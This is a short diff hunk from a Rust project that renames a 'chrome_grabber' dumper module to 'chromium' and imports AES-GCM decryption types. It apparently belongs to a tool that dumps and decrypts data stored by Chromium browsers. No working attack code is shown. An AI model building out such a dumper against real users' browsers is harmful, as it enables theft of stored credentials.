@@ -1,4 +1,4 @@
-use crate::chrome_grabber::dumper::DumperError;
+use crate::chromium::dumper::DumperError;
 use aes_gcm::aead::{generic_array::GenericArray, Aead, NewAead};
 use aes_gcm::Aes256Gcm;
 use std::ptr;
